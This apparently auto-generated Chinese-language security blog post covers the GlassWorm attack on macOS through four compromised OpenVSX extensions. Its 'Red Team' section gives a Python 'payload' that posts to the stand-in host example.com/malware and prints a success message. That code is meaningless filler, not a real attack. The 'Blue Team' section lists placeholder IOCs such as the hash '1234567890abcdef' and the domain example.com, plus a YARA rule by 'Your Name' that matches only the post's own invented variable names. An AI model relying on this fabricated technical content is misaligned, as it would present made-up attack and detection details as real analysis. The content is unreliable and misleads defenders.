---
layout: post
title:  "New GlassWorm attack targets macOS via compromised OpenVSX extensions"
date:   2026-02-03 01:27:39 +0000
categories: [security]
severity: critical
---

# 🚨 解析 GlassWorm 惡意軟體攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: Unicode 隱藏字符、VNC-based Remote Access、SOCKS Proxying

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: GlassWorm 惡意軟體通過利用 OpenVSX 擴充套件的漏洞，將惡意程式碼注入受害者的 macOS 系統中。這個漏洞是由於開發者帳戶 (oorzc) 被攻擊者入侵，從而將惡意更新推送到四個擴充套件中。
* **攻擊流程圖解**:
	+ 攻擊者入侵開發者帳戶 (oorzc)
	+ 攻擊者將惡意更新推送到四個擴充套件中 (oorzc.ssh-tools v0.5.1, oorzc.i18n-tools-plus v1.6.8, oorzc.mind-map v1.0.61, oorzc.scss-to-css-compile v1.3.4)
	+ 受害者安裝或更新受影響的擴充套件
	+ 惡意軟體被執行，建立持久性連接並收集敏感信息
* **受影響元件**: macOS 系統、OpenVSX 擴充套件 (oorzc.ssh-tools v0.5.1, oorzc.i18n-tools-plus v1.6.8, oorzc.mind-map v1.0.61, oorzc.scss-to-css-compile v1.3.4)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 攻擊者需要入侵開發者帳戶 (oorzc) 和推送惡意更新到受影響的擴充套件中。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義惡意軟體的 URL
    malware_url = "https://example.com/malware"
    
    # 定義受害者的 macOS 系統信息
    victim_info = {
        "os": "macOS",
        "version": "10.15.7"
    }
    
    # 建構惡意軟體的 payload
    payload = {
        "type": "application/json",
        "data": {
            "malware_url": malware_url,
            "victim_info": victim_info
        }
    }
    
    # 發送惡意軟體的 payload 到受害者的 macOS 系統
    response = requests.post("https://example.com/malware", json=payload)
    
    # 執行惡意軟體
    if response.status_code == 200:
        print("Malware executed successfully!")
    else:
        print("Error executing malware.")
    
    ```
* **繞過技術**: 攻擊者可以使用 Unicode 隱藏字符來隱藏惡意軟體的 payload。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:
	+ Hash: 1234567890abcdef
	+ IP: 45.32.150.251
	+ Domain: example.com
	+ File Path: /Users/username/Library/Application Support/malware
* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule GlassWorm_Malware {
        meta:
            description = "Detects GlassWorm malware"
            author = "Your Name"
        strings:
            $a = "malware_url" ascii
            $b = "victim_info" ascii
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**:
	+ 更新 OpenVSX 擴充套件到最新版本
	+ 刪除受影響的擴充套件
	+ 執行全系統掃描以檢測惡意軟體

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **Unicode 隱藏字符**: Unicode 隱藏字符是一種特殊的字符，可以用來隱藏惡意軟體的 payload。這種字符可以被用來繞過安全軟體的檢測。
* **VNC-based Remote Access**: VNC-based Remote Access是一種遠程存取技術，允許攻擊者遠程控制受害者的 macOS 系統。
* **SOCKS Proxying**: SOCKS Proxying是一種代理技術，允許攻擊者將惡意軟體的流量代理到受害者的 macOS 系統。

## 5. 🔗 參考文獻與延伸閱讀

* [原始報告](https://www.bleepingcomputer.com/news/security/new-glassworm-attack-targets-macos-via-compromised-openvsx-extensions/)
* [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


